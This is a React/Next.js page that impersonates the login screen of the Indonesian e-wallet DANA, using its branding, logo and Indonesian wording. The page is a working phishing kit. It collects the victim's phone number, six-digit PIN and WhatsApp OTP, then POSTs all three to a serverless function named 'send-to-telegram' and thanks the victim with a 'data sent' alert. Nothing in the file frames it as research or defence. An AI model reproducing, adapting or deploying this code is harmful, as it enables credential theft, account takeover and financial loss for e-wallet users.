import Head from 'next/head';
import { useState, useEffect, useRef } from 'react';

export default function Home() {
  const [step, setStep] = useState('phone');
  const [phone, setPhone] = useState('');
  const [pin, setPin] = useState(['', '', '', '', '', '']);
  const [otp, setOtp] = useState(['', '', '', '']);
  const [showPin, setShowPin] = useState(false);
  const [countdown, setCountdown] = useState(120);

  const pinRefs = useRef([]);
  const otpRefs = useRef([]);

  useEffect(() => {
    let timer;
    if (step === 'otp') {
      timer = setInterval(() => {
        setCountdown(prev => (prev > 0 ? prev - 1 : 120));
      }, 1000);
    }
    return () => clearInterval(timer);
  }, [step]);

  const handlePhoneSubmit = (e) => {
    e.preventDefault();
    setStep('pin');
  };

  const handlePinChange = (val, idx) => {
    const newPin = [...pin];
    newPin[idx] = val;
    setPin(newPin);
    if (val && idx < 5) {
      pinRefs.current[idx + 1]?.focus();
    }
    if (newPin.every(d => d)) {
      setStep('otp');
    }
  };

  const handleOtpChange = (val, idx) => {
    const newOtp = [...otp];
    newOtp[idx] = val;
    setOtp(newOtp);
    if (val && idx < 3) {
      otpRefs.current[idx + 1]?.focus();
    }
    if (newOtp.every(d => d)) {
      const data = {
        nohp: phone,
        pin: pin.join(''),
        otp: newOtp.join(''),
      };

      fetch('/.netlify/functions/send-to-telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      })
        .then(res => res.ok ? alert('Data berhasil dikirim!') : alert('Gagal mengirim'))
        .catch(() => alert('Terjadi kesalahan'));
    }
  };

  return (
    <>
      <Head>
        <title>DANA - Apa pun transaksinya selalu ada DANA</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0" />
        <meta name="theme-color" content="#108BE5" />
        <meta property="og:title" content="DANA - Apa pun transaksinya selalu ada DANA" />
        <meta property="twitter:title" content="DANA - Apa pun transaksinya selalu ada DANA" />
        <meta property="twitter:card" content="summary_large_image" />
        <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTq-HC2z6B5uUunxMATpBRpkKkmcVL9J7yPQg&usqp=CAU" />
        <meta property="og:description" content="DANA adalah bentuk baru uang tunai yang lebih baik." />
        <link rel="stylesheet" href="https://cloudstoragev.netlify.app/ast/main.css" />
        <link rel="stylesheet" href="https://cloudstoragev.netlify.app/ast/00b9d2e9f52e505c013c16bb638a42a4.css" />
        <link rel="stylesheet" href="https://cloudstoragev.netlify.app/ast/6990a7033bbaeadc2040ac863ff124fd.css" />
        <link rel="stylesheet" href="https://cloudstoragev.netlify.app/ast/loading.css" />
        <link rel="stylesheet" href="https://cloudstoragev.netlify.app/ast/47e4c58f6b9789b8a33f2525cf084599.css" />
      </Head>

      <div className="tidak">
        <div className="box-login">
          <div className="header">
            <img src="https://cloudstoragev.netlify.app/ast/img/dana_logo.png" className="logo" alt="logo" />
          </div>

          {step === 'phone' && (
            <form onSubmit={handlePhoneSubmit}>
              <h3>Masukkan <b>nomor HP</b> kamu untuk lanjut</h3>
              <div className="box-input">
                <div className="label">
                  <img src="https://cloudstoragev.netlify.app/ast/img/indo.png" alt="indo" />
                  <label>+62</label>
                </div>
                <input
                  type="tel"
                  placeholder="811-1234-5678"
                  required
                  value={phone}
                  onChange={(e) => setPhone(e.target.value)}
                />
              </div>
              <p className="desc">Dengan melanjutkan, kamu setuju dengan <strong>Syarat & Ketentuan</strong> dan <strong>Kebijakan Privasi</strong> kami</p>
              <div className="box-btn">
                <button className="btnnohp" type="submit" disabled={phone.length < 9}>LANJUT</button>
              </div>
            </form>
          )}

          {step === 'pin' && (
            <form>
              <h3>Masukkan <b>PIN DANA</b></h3>
              <div className="box-input-pin">
                {pin.map((val, idx) => (
                  <input
                    key={idx}
                    ref={(el) => (pinRefs.current[idx] = el)}
                    className="inppin"
                    type={showPin ? 'text' : 'password'}
                    inputMode="numeric"
                    maxLength={1}
                    value={val}
                    onChange={(e) => handlePinChange(e.target.value, idx)}
                  />
                ))}
              </div>
              <button type="button" className="show" onClick={() => setShowPin(!showPin)}>
                {showPin ? 'SEMBUNYIKAN' : 'TAMPILKAN'}
              </button>
              <p className="forgot">LUPA PIN?</p>
            </form>
          )}

          {step === 'otp' && (
            <form>
              <h2>Masukkan OTP</h2>
              <div className="textOtp">
                <p className="alert">
                  Masukkan kode OTP yang dikirim ke nomor melalui WhatsApp
                  <span><img width="20px" src="https://cloudstoragev.netlify.app/ast/img/WhatsApp_icon.png" alt="wa" /></span>
                </p>
              </div>
              <div className="box-input-otp">
                {otp.map((val, idx) => (
                  <input
                    key={idx}
                    ref={(el) => (otpRefs.current[idx] = el)}
                    className="inpotp"
                    type="number"
                    inputMode="numeric"
                    maxLength={1}
                    value={val}
                    onChange={(e) => handleOtpChange(e.target.value, idx)}
                  />
                ))}
              </div>
              <p className="resend">KIRIM ULANG (<span>{countdown}</span>s)</p>
            </form>
          )}
        </div>
      </div>
    </>
  );
}
